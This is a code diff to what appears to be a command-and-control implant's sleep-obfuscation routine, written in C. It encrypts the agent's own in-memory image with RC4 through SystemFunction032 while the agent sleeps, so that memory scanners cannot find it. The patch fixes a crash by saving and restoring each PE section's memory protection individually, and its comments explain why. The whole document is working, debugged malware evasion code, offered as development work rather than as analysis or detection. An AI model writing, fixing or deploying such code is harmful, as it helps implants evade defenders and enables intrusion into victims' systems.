@@ -277,6 +277,53 @@ void evasion_sleep_obfuscated(DWORD milliseconds) {
     DWORD imageSize;
     _get_module_bounds(&imageBase, &imageSize);
 
+    /*
+     * Save per-section memory protections BEFORE we touch anything.
+     *
+     * The old code did a single VirtualProtect on the entire image and
+     * saved one oldProtect value.  VirtualProtect returns the protection
+     * of the FIRST page only.  On restore, ALL sections got that one
+     * protection — .text lost RX, .data lost RW → crash after first
+     * sleep cycle.
+     *
+     * Fix: walk PE sections, save each protection individually on the
+     * stack (the stack is NOT part of the PE image, so it survives
+     * encryption).  After decrypt, restore each section separately.
+     */
+    typedef struct { void *base; DWORD size; DWORD prot; } _SecProt;
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE *)imageBase + dos->e_lfanew);
+    PIMAGE_SECTION_HEADER secs = IMAGE_FIRST_SECTION(nt);
+    WORD numSec = nt->FileHeader.NumberOfSections;
+    DWORD hdrSize = nt->OptionalHeader.SizeOfHeaders;
+
+    /* Max 32 sections + 1 for PE header = 33.  Real PEs rarely exceed 10. */
+    _SecProt saved[33];
+    int savedCount = 0;
+
+    /* Save & change PE header protection */
+    DWORD tmpProt;
+    VirtualProtect(imageBase, hdrSize, PAGE_READWRITE, &tmpProt);
+    saved[savedCount].base = imageBase;
+    saved[savedCount].size = hdrSize;
+    saved[savedCount].prot = tmpProt;
+    savedCount++;
+
+    /* Save & change each section */
+    for (WORD i = 0; i < numSec && savedCount < 33; i++) {
+        DWORD sSize = secs[i].Misc.VirtualSize;
+        if (sSize == 0) sSize = secs[i].SizeOfRawData;
+        if (sSize == 0) continue;
+
+        void *sBase = (BYTE *)imageBase + secs[i].VirtualAddress;
+        VirtualProtect(sBase, sSize, PAGE_READWRITE, &tmpProt);
+        saved[savedCount].base = sBase;
+        saved[savedCount].size = sSize;
+        saved[savedCount].prot = tmpProt;
+        savedCount++;
+    }
+
     /* RC4 key — random per sleep cycle */
     unsigned char rc4Key[16];
     BCryptGenRandom(NULL, rc4Key, sizeof(rc4Key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
@@ -284,23 +331,22 @@ void evasion_sleep_obfuscated(DWORD milliseconds) {
     USTRING data = { imageSize, imageSize, (PUCHAR)imageBase };
     USTRING key  = { sizeof(rc4Key), sizeof(rc4Key), rc4Key };
 
-    /* Step 1: Make image RW (so we can encrypt it) */
-    DWORD oldProtect;
-    VirtualProtect(imageBase, imageSize, PAGE_READWRITE, &oldProtect);
-
-    /* Step 2: Encrypt with RC4 */
+    /* Encrypt with RC4 (image is already fully RW from per-section changes) */
     SystemFunction032(&data, &key);
 
-    /* Step 3: Sleep (agent code is encrypted + non-executable) */
+    /* Sleep (agent code is encrypted + non-executable) */
     Sleep(milliseconds);
 
-    /* Step 4: Decrypt with same RC4 key (RC4 is symmetric/self-inverting with same key stream) */
-    /* Re-init key since RC4 state was consumed. We need a fresh call. */
-    /* Actually SystemFunction032 reinitializes from key each call, so same key works. */
+    /* Decrypt with same RC4 key.
+     * SystemFunction032 re-initializes KSA from key on each call,
+     * so the same key produces the same keystream → decrypts correctly. */
     SystemFunction032(&data, &key);
 
-    /* Step 5: Restore RX */
-    VirtualProtect(imageBase, imageSize, oldProtect, &oldProtect);
+    /* Restore each section's original protection from stack-saved array */
+    for (int i = 0; i < savedCount; i++) {
+        DWORD dummy;
+        VirtualProtect(saved[i].base, saved[i].size, saved[i].prot, &dummy);
+    }
 
     /* Wipe key */
     SecureZeroMemory(rc4Key, sizeof(rc4Key));
